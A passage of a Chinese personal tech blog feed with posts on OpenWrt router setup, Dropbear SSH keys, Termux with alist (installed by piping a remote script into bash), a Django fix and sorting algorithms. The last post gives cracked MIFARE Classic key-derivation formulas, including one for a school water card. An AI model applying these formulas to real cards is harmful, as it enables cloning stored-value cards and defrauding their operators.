        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>书接上回。自从买了路由器之后，一周都在不停的刷固件来玩，至今也刷了十几个了。其实当初买k2p的主要目的还是想多拨。因为我们学校校园网一台设备只有40Mbps的上下行带宽。在2022年，家里WiFi都已经是几百兆的时代，40兆的校园网真的太拉了。而且一个账号只能连三台设备，我一个人都有6台需要联网的设备（3台手机+1台ipad+1台电脑+1个小爱同学）。所以整了个二手k2p。但是感觉翻车了，现在只能凑合用了。</p><h3 id="刷入Openwrt固件"><a href="#刷入Openwrt固件" class="headerlink" title="刷入Openwrt固件"></a>刷入Openwrt固件</h3><p>k2p有很多很好用的固件，像老毛子，潘朵拉，高恪，op等等。这里我选op。是因为op支持我校园网的多拨。虽然高恪也支持多拨，但是只支持传统的PPOE拨号，不支持DHCP认证。</p><blockquote><p>要是已经刷入op系统可以跳过哦</p></blockquote><p>废话不多说，首先呢我们先要去网上找k2p的op固件，可以自己编译也可以用别人编译好的。找固件可以上<a href="https://www.right.com.cn/FORUM/forum.php">恩山无线论坛 (right.com.cn)</a>的斐讯专区里的k2p专区，这里有很多，随便找一个。</p><p><img src="http://cdn.lmark.cc/img/image-20220923005442924.png"></p><p>需要注意的是，你的k2p的芯片的型号是什么，这个可以在路由器底部的铭牌上找到</p>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Openwrt </tag>
            
            <tag> 路由器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      
        <title>使用Windows(OpenSSH)实现私钥免密码连接Linux(DropbearSSH)服务器</title>
      
      <link href="/archives/e74a4c2c.html"/>
      <url>/archives/e74a4c2c.html</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>今天晚上又折腾了一个晚上的路由器，终于搞定了局域网的端口转发到校园网。以后可以在学校的任何一个角落都连接到我的电脑了，乐。详细的操作之后有时间再记录吧，今天先来写一个简单的经验分享。因为路由器需要多拨，我自己设置的自动拨号频率是十分钟一次，但是有时候很容易掉一两个号，这时候就需要我手动拨号乐。以前每次拨号都需要远程连接一下路由器命令行来执行脚本，实在是太麻烦了。所以我就想，能不能直接在电脑上发送一条指令让路由器自动拨号，然后我就找到了ssh客户端的私钥验证方法，但是路由器装的是DropbearSSH，所以和网上的大多数教程不太一样，遂自己参考大神的方法自己写了一个</p><hr><h3 id="关于DropbearSSH和openSSH"><a href="#关于DropbearSSH和openSSH" class="headerlink" title="关于DropbearSSH和openSSH"></a>关于DropbearSSH和openSSH</h3><p>一般我们的windows电脑上都会自带一个SSH客户端，就是这个openSSH，这是一个功能齐全的SSH客户端，在诸多平台上都有存在。</p><p><img src="http://cdn.lmark.cc/img/image-20220915022247046.png"></p><p>一般的Linux发行版都安装有OpenSSH，但是在路由器上，由于空间不足，很多固件会选择使用DropbearSSH。</p><p>关于DropbearSSH:</p><blockquote><p>dropbear作为一款基于ssh协议的轻量级sshd服务器，相比OpenSSH，其更简洁，更小巧</p><p><img src="http://cdn.lmark.cc/img/image-20220915023036908.png"></p></blockquote><p>所以这个ssh客户端的私钥验证和普通的ssh客户端有些不同，下面我会详细说说</p><hr><h3 id="在Windows上创建密钥对"><a href="#在Windows上创建密钥对" class="headerlink" title="在Windows上创建密钥对"></a>在Windows上创建密钥对</h3><p>首先我们需要创建一对公钥和私钥，公钥放在远程Linux服务器上，私钥则放在本地的电脑上。</p><p>创建一个4096位的密钥对，并以你的邮箱为注释</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\PBDELL&gt; ssh<span class="literal">-keygen</span> <span class="literal">-t</span> rsa <span class="literal">-b</span> <span class="number">4096</span> <span class="literal">-C</span> <span class="string">&quot;your_email@domain.com&quot;</span></span><br></pre></td></tr></table></figure><p>创建的时候，它会提示你选择密钥对存放路径，直接按回车则存在默认的路径下</p><p><img src="http://cdn.lmark.cc/img/image-20220915023530830.png"></p><p>接下来，如果你之前已经创建过密钥对了，最好不要覆盖，不然之前使用这个公钥的应用就会出问题，比如github</p><p><img src="http://cdn.lmark.cc/img/image-20220915023714884.png"></p><p>此时，密钥对创建就完成了，可以在刚刚目录下看到刚刚创建的密钥对文件</p><p><img src="http://cdn.lmark.cc/img/image-20220915023845107.png"></p><p><code>id_rsa</code>是私钥，<code>id_rsa.pub</code>是密钥（等会上传上服务器的）</p><hr><h3 id="上传私钥至服务器"><a href="#上传私钥至服务器" class="headerlink" title="上传私钥至服务器"></a>上传私钥至服务器</h3><p>对于一般的OpenSSH，公钥放在的是<code>~/.ssh/authorized_keys</code>这个文件中，用以下这条指令即可一键完成：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type C:\Users\PBDELL\.ssh\id_rsa.pub | ssh &#123;IP-ADDRESS-OR-FQDN&#125; &quot;cat &gt;&gt; .ssh/authorized_keys&quot;</span><br></pre></td></tr></table></figure><p>如果远程服务器用的是DropbearSSH，则上传路径需要改一下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type C:\Users\PBDELL\.ssh\id_rsa.pub | ssh &#123;IP-ADDRESS-OR-FQDN&#125; &quot;cat &gt;&gt; /etc/dropbear/authorized_keys&quot;</span><br></pre></td></tr></table></figure><p><img src="http://cdn.lmark.cc/img/image-20220915025152141.png"></p><p>运行完成后，可以看到远程服务器就生成了一个公钥文件</p><p><img src="http://cdn.lmark.cc/img/image-20220915025235806.png"></p><p>这时我们就可以直接ssh连接到远程服务器而不需要使用密码了</p><p><img src="http://cdn.lmark.cc/img/image-20220915025332683.png"></p><p>也可以直接在电脑上执行脚本，不用打开FinalShell来连接了</p><p><img src="http://cdn.lmark.cc/img/image-20220915025643733.png"></p><hr><h3 id="一些便捷的用法"><a href="#一些便捷的用法" class="headerlink" title="一些便捷的用法"></a>一些便捷的用法</h3><p>服务器存了密钥之后，就可以不用输密码连接服务器乐，这时候我们可以在自己的电脑上写脚本发送命令给服务器执行乐</p><p>比如一个让服务器跑拨号的bat脚本</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line">ssh root@192.168.6.1 &quot;/root/auth.sh&quot;</span><br><span class="line">pause</span><br></pre></td></tr></table></figure><p>在结合上utools，可以实现秒开！</p><p><img src="http://cdn.lmark.cc/img/image-20220916235847122.png"></p><h3 id="尾声"><a href="#尾声" class="headerlink" title="尾声"></a>尾声</h3><p>困，不过路由器太好玩了</p>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> openwrt </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      
        <title>安卓Termux安装ubuntu+alist实现文件中继服务</title>
      
      <link href="/archives/b2e71f46.html"/>
      <url>/archives/b2e71f46.html</url>
      
        <content type="html"><![CDATA[<h3 id="1-前言"><a href="#1-前言" class="headerlink" title="1.前言"></a>1.前言</h3><p>上几周刚搬校区，来到了一个鸟不生蛋的好地方，三面都是荒地，一面是大海，海的对面是南朝鲜。除了宿舍稍微好点，其他地方都输麻乐。不过，新宿舍有了明显的网线口，这就能让我完成上个学期一直没完成的计划乐——拿我的二手小米5搭个alist服务，这样我就可以，同时管理多个网盘乐。</p><p>之前因为校园网账号不够，所以这台小米5就没有拿来用，装了k2p路由器后，再也不缺网乐，所以便有了今天的计划。</p><hr><h3 id="2-安装Termux"><a href="#2-安装Termux" class="headerlink" title="2.安装Termux"></a>2.安装Termux</h3><p>Termux到处都能找得到，葫芦侠，酷安等等。当然也可以看看官网：<a href="https://termux.dev/en/">Termux | The main termux site and help pages.</a>然后打开首页</p><p><img src="http://cdn.lmark.cc/img/Screenshot_2022-09-12-02-19-57-532_com.termux.jpg" alt="Screenshot_2022-09-12-02-19-57-532_com.termux"></p><p>有了linux系统，咱一般做的第一步就是——换源。不然默认源的下载速度太慢了，Termux换源方法网上很多，这里推荐一个简单的：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed -i <span class="string">&#x27;s@^\(deb.*stable main\)$@#\1\ndeb https://mirrors.tuna.tsinghua.edu.cn/termux/termux-packages-24 stable main@&#x27;</span> <span class="variable">$PREFIX</span>/etc/apt/sources.list</span><br></pre></td></tr></table></figure><p>然后我们还需要使用sudo来执行命令，所以使用pkg安装一个：<code>pkg install tsu</code></p><p><img src="http://cdn.lmark.cc/img/Screenshot_2022-09-12-15-55-44-014_com.termux.jpg" alt="Screenshot_2022-09-12-15-55-44-014_com.termux"></p><p>准备工作完成，接下来就可以开始安装Ubuntu系统了</p><hr><h3 id="3-安装Ubuntu"><a href="#3-安装Ubuntu" class="headerlink" title="3.安装Ubuntu"></a>3.安装Ubuntu</h3><p>在没有root的情况下Termux是不能直接装ubuntu的，这里需要用到一个工具Proot，来安装‘阉割版’的Ubuntu。</p><p>关于proot</p><p><img src="http://cdn.lmark.cc/img/22b263f4cb6440c4b8cfb7a239741fa4.png" alt="img"></p><p>首先先安装proot</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pkg install proot-distro </span><br></pre></td></tr></table></figure><p>安装完成后，可以使用</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proot-distro list</span><br></pre></td></tr></table></figure><p>查看可以安装的Linux发行版</p><p><img src="http://cdn.lmark.cc/img/Screenshot_2022-09-12-16-07-28-543_com.termux.jpg" alt="Screenshot_2022-09-12-16-07-28-543_com.termux"></p><p>接下来就可以选择你想安装的Linux发行版本了，这里我选择Ubuntu</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proot-distro install ubuntu</span><br></pre></td></tr></table></figure><p><img src="http://cdn.lmark.cc/img/image-20220912162213928.png"></p><p>安装完成后，可以使用如下命令进入系统</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proot-distro login ubuntu</span><br></pre></td></tr></table></figure><p><img src="http://cdn.lmark.cc/img/image-20220912162311829.png"></p><p>出现<strong>root@localhost:~#</strong> 代表已进入Ubuntu环境，<strong>root@localhost:~#</strong> 的含义如下：</p><p><img src="http://cdn.lmark.cc/img/ec632584d109405ba9f132c474ec4e61.png" alt="img"></p><p>如果需要退出Ubuntu系统则需要输入<code>exit</code></p><hr><h3 id="4-安装alist"><a href="#4-安装alist" class="headerlink" title="4.安装alist"></a>4.安装alist</h3><p>alist安装起来非常简单，一条命令搞定。更新和卸载也非常方便。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Install</span></span><br><span class="line">curl -fsSL <span class="string">&quot;https://alist.nn.ci/install.sh&quot;</span> | bash -s install /root</span><br><span class="line"><span class="comment"># update</span></span><br><span class="line">curl -fsSL <span class="string">&quot;https://alist.nn.ci/install.sh&quot;</span> | bash -s update /root</span><br><span class="line"><span class="comment"># Uninstall</span></span><br><span class="line">curl -fsSL <span class="string">&quot;https://alist.nn.ci/install.sh&quot;</span> | bash -s uninstall /root</span><br></pre></td></tr></table></figure><p><img src="http://cdn.lmark.cc/img/image-20220912164317614.png"></p><p><img src="http://cdn.lmark.cc/img/image-20220912164337004.png"></p><p>这时候如果直接使用systemctl命令是启动不了的，因为Termux的Ubuntu根本没有这条命令， 所以，我们需要去到alist的安装目录下<code>/opt/alist</code>手动启动一下。</p><p><img src="http://cdn.lmark.cc/img/QQ%E5%9B%BE%E7%89%8720220913234229.jpg" alt="QQ图片20220913234229"></p><p>因为我这里安装的alist是2.6.2版本的，所以可以直接启动，如果是3.0版本的alist可能还需要安装aria2，</p><p><img src="http://cdn.lmark.cc/img/QQ%E5%9B%BE%E7%89%8720220913234235.jpg" alt="QQ图片20220913234235"></p><p>至此alist搭建就完成了，现在可以享受内网上传资源的高速体验了！！！</p><p><img src="http://cdn.lmark.cc/img/image-20220913234712124.png"></p><p>浅浅测试一下，上传个视频上阿里云：</p><p><img src="http://cdn.lmark.cc/img/image-20220913235033880.png"></p><p>上传速度还是非常快的！</p><h3 id="5-参考链接和想说的话"><a href="#5-参考链接和想说的话" class="headerlink" title="5.参考链接和想说的话"></a>5.参考链接和想说的话</h3><p><a href="https://blog.csdn.net/weixin_49663860/article/details/123438567">Termux安装完整版Linux(Ubuntu)详细步骤_果园子的博客-CSDN博客_termux安装ubuntu</a></p><p><a href="https://alist-doc.nn.ci/">Alist Document (nn.ci)</a></p><p>有了路由器之后，感觉我又有好多新东西可以折腾了，下期准备介绍一下我买的二手斐讯刷机和路由器多拨</p>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> alist </tag>
            
            <tag> Termux </tag>
            
            <tag> Ubuntu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      
        <title>Django 报错 &#39;WSGIRequest&#39; object has no attribute &#39;data&#39; 的一个解决方法</title>
      
      <link href="/archives/1b50bad4.html"/>
      <url>/archives/1b50bad4.html</url>
      
        <content type="html"><![CDATA[<h2 id="报错截图"><a href="#报错截图" class="headerlink" title="报错截图"></a>报错截图</h2><hr><p><img src="http://cdn.lmark.cc/img/image-20220901015755972.png"></p><h2 id="报错描述"><a href="#报错描述" class="headerlink" title="报错描述"></a>报错描述</h2><hr><p>之前写Django后台的时候没遇到过这个bug，是今天写项目才遇到的bug</p><h2 id="报错分析"><a href="#报错分析" class="headerlink" title="报错分析"></a>报错分析</h2><hr><p>看报错，是出在一个自定义的权限认证函数中，在仔细看看报错，发现是后台登录使用了自定义的权限认证类</p><p><img src="http://cdn.lmark.cc/img/image-20220901020129852.png"></p><p>在Pycharm中用 <code>Ctrl + shift + N</code> 输入文件地址，找到这个文件<code>__init__.py</code>的77行对应的函数调用，</p><p><img src="http://cdn.lmark.cc/img/image-20220901020413298.png"></p><p>再 <code>Ctrl + 鼠标左键</code> 点击查看 这个backend从哪里来的</p><p><img src="http://cdn.lmark.cc/img/image-20220901020500641.png"></p><p>现在可以看到，这个<code>_get_backends</code>函数很可疑，我们再跳转看一下</p><p><img src="http://cdn.lmark.cc/img/image-20220901020549436.png"></p><p>到这里真相水落石出了，</p><p><code>get_backends</code>函数从settings的<code>AUTHENTICATION_BACKENDS</code>里面寻找权限认证类，然而我忘了添加自带的权限认证类，只有我自定义的权限认证类，所以这个函数就使用了自定义的权限认证类。</p><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><hr><p>添加 <code>django.contrib.auth.backends.ModelBackend</code> 即可解决问题</p><p><img src="http://cdn.lmark.cc/img/image-20220901020810505.png"></p><h2 id="一丢丢心得"><a href="#一丢丢心得" class="headerlink" title="一丢丢心得"></a>一丢丢心得</h2><hr><p>暑假写的项目，可以说通过这个项目，对Django有了更深入的了解，也学会了往底层找问题，重写某些类的方法，之后浅浅分享一下Pycharm写Django的心得吧。</p><p>最后想说，写这个项目好难，又好累，还是好好学习吧。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Django </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      
        <title>算法笔记①——快速排序and归并排序and二分查找</title>
      
      <link href="/archives/31f4e153.html"/>
      <url>/archives/31f4e153.html</url>
      
        <content type="html"><![CDATA[<p>浅浅记录一下，学的快排与归并与二分。视频地址：<a href="https://www.acwing.com/video/10/">第一章 基础算法（一） - AcWing</a></p><h3 id="快速排序"><a href="#快速排序" class="headerlink" title="快速排序"></a>快速排序</h3><p>听名字就知道是很快的算法，听了y总深入浅出的解释，我对于快速排序的理解进一步加深了。在大一上的计导课里，有一个实验就是让我们用人体计算机的方式实现快排。当时，不记得是王老师还是助教说只能使用单指针的快排，然后我琢磨乐好久也没搞明白该怎么排，后面半推半就做完了那个实验。之后，快排就忘得一干二净了哈哈哈哈。现在听了y总的课，我总结出了以下几个要点，记住这几个要点，可以更容易背住模板。</p><blockquote><ol><li>当递归到最底层，只有一个元素的时候，是不用排序的，所以此时直接return即可，这也是递归的出口，判断条件就是左边界是否大于右边界。</li><li>选取一个分界的数，可以选数组里任何一个数，第一，最后，中间都可以，看情况</li><li>选取左右指针时，要选在两个指针的外边；左指针就在左边界减一处；右指针在有边界加一处。</li><li>对于一次快排，原理就是使所有比 X（选定的数）小的数在X左边；所有比X大的数在X的右边，所以套一层while循环，判断条件是两指针是否相遇。</li><li>然后两个指针开始移动，左指针往右移动，遇到第一个比X大的数停下；右指针同理。</li><li>两个指针停下后，如果没相遇，就交换两个数。</li><li>然后分成两个区间，再递归使用快排。</li></ol></blockquote><p>快排模板</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">1e6</span><span class="number">+10</span>;</span><br><span class="line"><span class="type">int</span> q[N];</span><br><span class="line"><span class="type">int</span> n; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">quick_sort</span><span class="params">(<span class="type">int</span> q[],<span class="type">int</span> l,<span class="type">int</span> r)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (l &gt;= r) <span class="keyword">return</span> ;<span class="comment">//递归出口</span></span><br><span class="line">    </span><br><span class="line"><span class="type">int</span> i = l - <span class="number">1</span>;<span class="comment">//左右指针</span></span><br><span class="line"><span class="type">int</span> j = r + <span class="number">1</span>;</span><br><span class="line"><span class="type">int</span> x = q[l + r &gt;&gt; <span class="number">1</span>]; <span class="comment">//位运算，比直接除以2更快，相当于除以2的一次方</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">while</span> (i &lt; j)&#123;</span><br><span class="line"><span class="keyword">do</span> i++;<span class="keyword">while</span> (q[i] &lt; x);</span><br><span class="line"><span class="keyword">do</span> j--;<span class="keyword">while</span> (q[j] &gt; x);</span><br><span class="line"><span class="keyword">if</span> (i &lt; j) <span class="built_in">swap</span>(q[i],q[j]);</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="built_in">quick_sort</span>(q,l,j);<span class="comment">//这里也可使用i做分界，不过参数会发生变化</span></span><br><span class="line"><span class="built_in">quick_sort</span>(q,j<span class="number">+1</span>,r); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>;i &lt; n;i++) <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;q[i]);<span class="comment">//scanf比cin更快</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">quick_sort</span>(q,<span class="number">0</span>,n - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>;i &lt; n;i++) <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,q[i]);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h3 id="归并排序"><a href="#归并排序" class="headerlink" title="归并排序"></a>归并排序</h3><p>这是我见过比较神奇的一种排序。和快排一样，归并排序核心思想也是分治，但是和快排不同，归并是从底层开始，其有一个明显的特征，就是会出现左右两组数的比较，这也是归并的一个很明显的特征，可以用在很多地方。另外归并排序算是递归这一结构神奇之处的一个非常好的体现，即<strong>你可以实现它，但你不一定能理解它，它符合逻辑，但是你不一定能理解为什么。</strong></p><p>放张图好理解归并排序</p><p><img src="http://cdn.lmark.cc/img/154035112_1_20190212015806351.jpg" alt="154035112_1_20190212015806351"></p><p>其核心逻辑就是<strong>先把数组一分为二，用归并排序排序好。此时得到两个有序数组，再新建一个临时数组，把两个数组中的元素一个一个按大小插入，合并成一个有序数组。</strong>可以看到核心逻辑是非常的简单了。代码模板有几个需要注意的点：</p><blockquote><ol><li>当递归到最底层，只有一个元素的时候，是不用排序的，所以此时直接return即可，这也是递归的出口，判断条件就是左边界是否大于右边界。</li><li>然后去一个中间值把数组分成两部分后直接用归并排序进行排序</li><li>接下来就是合并两个有序数组，这里需要用到三个指针分别指向两个有序数组和临时数组的开头。</li><li>然后就是三个while把两个数组拼起来的过程。</li><li>最后用一个for循环把排好序的临时数组放回原数组，结束</li></ol></blockquote><p>代码模板</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">1e+6</span>;</span><br><span class="line"><span class="type">int</span> q[N],temp[N];</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">merge_sort</span><span class="params">(<span class="type">int</span> q[],<span class="type">int</span> l, <span class="type">int</span> r )</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (l &gt;= r) <span class="keyword">return</span> ;</span><br><span class="line">    <span class="type">int</span> mid = l + r &gt;&gt; <span class="number">1</span>;<span class="comment">//将数组一分为二</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="built_in">merge_sort</span>(q,l,mid),<span class="built_in">merge_sort</span>(q,mid<span class="number">+1</span>,r);<span class="comment">//用归并排序将两部分数组给排好序</span></span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> k = <span class="number">0</span>, i = l , j = mid + <span class="number">1</span>;<span class="comment">//进行一个数组的合并</span></span><br><span class="line">    <span class="keyword">while</span> (i &lt;= mid &amp;&amp; j &lt;= r)&#123;</span><br><span class="line">        <span class="keyword">if</span> ( q[i] &lt; q[j] ) temp[k++] = q[i++];</span><br><span class="line">        <span class="keyword">else</span> temp[k++] = q[j++];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (i &lt;= mid) temp[k++] = q[i++];<span class="comment">//将没合并完的后半部分直接接上去</span></span><br><span class="line">    <span class="keyword">while</span> (j &lt;= r) temp[k++] = q[j++];</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (i = l,j = <span class="number">0</span>;i&lt;=r;i++,j++) q[i] = temp[j];<span class="comment">//赋值给原数组</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>;i &lt; n;i++) <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;q[i]);</span><br><span class="line"></span><br><span class="line"><span class="built_in">merge_sort</span>(q,<span class="number">0</span>,n - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>;i &lt; n;i++) <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,q[i]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 算法 </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      
        <title>记录一些M1卡密钥计算方式和校验位计算方式</title>
      
      <link href="/archives/abbb7553.html"/>
      <url>/archives/abbb7553.html</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>最近这两年陆陆续续收到一些M1卡的数据，每次简单滴破解了一下之后感觉挺有意思的，但是害怕以后没过多久就忘记了，所以打算以我能看懂的形式浅浅的记录一下。</p><h3 id="密钥算法"><a href="#密钥算法" class="headerlink" title="密钥算法"></a>密钥算法</h3><h4 id="算法一"><a href="#算法一" class="headerlink" title="算法一"></a>算法一</h4><p>这是个非常非常非常简单的算法，只涉及到了异或</p><p>UID和Key的映射关系如下图：</p><p><img src="http://cdn.lmark.cc/img/image-20220330183307320.png"></p><p>具体算法：</p><blockquote><p>u2 XOR 12 &#x3D; k1<br>u4 XOR A5 &#x3D; k2<br>u3 XOR 34 &#x3D; k3<br>u4 XOR AB &#x3D; k4<br>u2 XOR 6A &#x3D; k5<br>u1 XOR 36 &#x3D; k6</p></blockquote><p>u1,u2,u3,u4分别对应UID的第一，第二，第三和第四位，k1-k6分别对应Key中的第一到第六位。</p><p>一些数据</p><p><img src="http://cdn.lmark.cc/img/image-20220630183923953.png"></p><h4 id="算法二"><a href="#算法二" class="headerlink" title="算法二"></a>算法二</h4><p>这个算法是某个学校的水卡的密钥算法，可以说算是非常地复杂了，当时花了一个星期才破解出来。这个对应关系有点复杂，每一位的第一个和第二个数字有其单独的对应。</p><p>UID和Key的映射关系：</p><p><img src="http://cdn.lmark.cc/img/QYRqbiGvDIgFAzZ.jpg"></p><p>每一位Key的算法都有点复杂，比如</p><h5 id="Key1"><a href="#Key1" class="headerlink" title="Key1"></a>Key1</h5><p>以这个为原像，建立k1的映射</p><p><img src="http://cdn.lmark.cc/img/image-20220630195159189.png"></p><p>映射之后如下：</p><p><img src="http://cdn.lmark.cc/img/image-20220630195258005.png"></p><p>这里我们设第一个数字为a，第二个数字为b，则k1的算法可表示为：</p><blockquote><p>a XOR 1 &#x3D; 第一位数字</p><p>(30 - b)  % 16  &#x3D; 第二位数字</p></blockquote><p>这算是6位key中最简单的一个了。</p><h5 id="Key2"><a href="#Key2" class="headerlink" title="Key2"></a>Key2</h5><p>由原像映射的像如下</p><p><img src="http://cdn.lmark.cc/img/image-20220630201140675.png"></p><p>算法：</p><blockquote><p>如果 0 &lt;&#x3D; b &lt; 7:</p><p>则 (20 - a) % 16 &#x3D; 第一位数字</p><p>如果 7 &lt; b &lt; 16</p><p>则 (19 - a) % 16 &#x3D; 第一位数字</p><p>b XOR 1 &#x3D; 第二位数字</p></blockquote><h5 id="Key3"><a href="#Key3" class="headerlink" title="Key3"></a>Key3</h5><p>映射关系</p><p><img src="http://cdn.lmark.cc/img/image-20220630201632020.png"></p><p>算法：</p><blockquote><p>如果 0 &lt;&#x3D; b &lt; 7:</p><p>则 ((a + 1) % 16) XOR 5 &#x3D; 第一位数字</p><p>如果 7 &lt; b &lt; 16</p><p>则 a XOR 5 &#x3D; 第一位数字</p><p>(23 - b) % 16 &#x3D; 第二位数字</p></blockquote><h5 id="Key4"><a href="#Key4" class="headerlink" title="Key4"></a>Key4</h5><p>映射关系</p><p><img src="http://cdn.lmark.cc/img/image-20220630205130845.png"></p><p>算法：</p><blockquote><p>当0 &lt;&#x3D; a &lt; 14时</p><p>((a + 6) % 16) XOR 3 &#x3D; 第一位数字</p><p>当13 &lt; a &lt; 16时</p><p>((a + 5) % 16) XOR 3 &#x3D; 第一位数字</p><p>((b + 3) % 16) XOR A &#x3D; 第二位数字</p></blockquote><h5 id="Key5"><a href="#Key5" class="headerlink" title="Key5"></a>Key5</h5><p>映射关系</p><p><img src="http://cdn.lmark.cc/img/image-20220630214805245.png"></p><p>算法</p><blockquote><p>当0 &lt;&#x3D; b &lt; 12时</p><p>a XOR C &#x3D; 第一位数字</p><p>当 11 &lt; b &lt; 16时</p><p>((a + 1) % 16) XOR C &#x3D; 